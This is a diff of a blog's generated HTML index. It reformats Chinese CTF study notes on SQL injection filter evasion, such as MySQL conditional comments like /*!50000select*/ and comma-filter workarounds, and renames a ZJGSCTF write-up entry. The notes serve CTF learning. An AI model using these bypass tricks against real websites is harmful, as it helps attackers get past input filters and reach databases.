-<h3 id="Mysql条件注释的利用-…"><a href="#Mysql条件注释的利用-…" class="headerlink" title="Mysql条件注释的利用  /! … /"></a>Mysql条件注释的利用  /<em>! … </em>/</h3><ul>
-<li><strong>/<em>! … </em>/</strong>:其中的语句如果在其它数据库中是不会被执行，但在MYSQL中它会执行。</li>
-<li><strong>/<em>!50000select</em>/</strong>:50000版本以上的  不执行括号中的语句 ，必定执行，用于过滤正则表达式</li>
-<li><strong>/<em>/</em> … */</strong></li>
+<h3 id="Mysql条件注释的利用"><a href="#Mysql条件注释的利用" class="headerlink" title="Mysql条件注释的利用  /*! ... */"></a>Mysql条件注释的利用  <code>/*! ... */</code></h3><ul>
+<li><code>/*! ... */</code>:其中的语句如果在其它数据库中是不会被执行，但在MYSQL中它会执行。</li>
+<li><code>/*!50000select*/</code>:50000版本以上的  不执行括号中的语句 ，必定执行，用于过滤正则表达式</li>
+<li><code>/*/* ... */</code></li>
 </ul>
 <h3 id="过滤逗号"><a href="#过滤逗号" class="headerlink" title="过滤逗号"></a>过滤逗号</h3><ul>
 <li><strong>limit ,</strong>中的<strong>,</strong> ：<a href="http://blog.csdn.net/keda8997110/article/details/8490895" target="_blank" rel="external">limit offset</a></li>
@@ -1340,7 +1666,7 @@ Content-Type: text/xml
     </entry>
     
     <entry>
-      <title><![CDATA[ZJGSCTF_writeup]]></title>
+      <title><![CDATA[ZJGSCTF-writeup]]></title>
       <url>/2017/09/18/ZJGSCTF_writeup/</url>
       <content type="html"><![CDATA[<p>——<a href="http://121.42.189.18" target="_blank" rel="external">ZJGSCTF</a>——-<br>——持续更新中——-<br><a id="more"></a></p>
 <h2 id="9-7-综合题"><a href="#9-7-综合题" class="headerlink" title="[9-7]综合题"></a>[9-7]综合题</h2><p><a href="http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/index.php" target="_blank" rel="external">戳这里=w=</a></p>
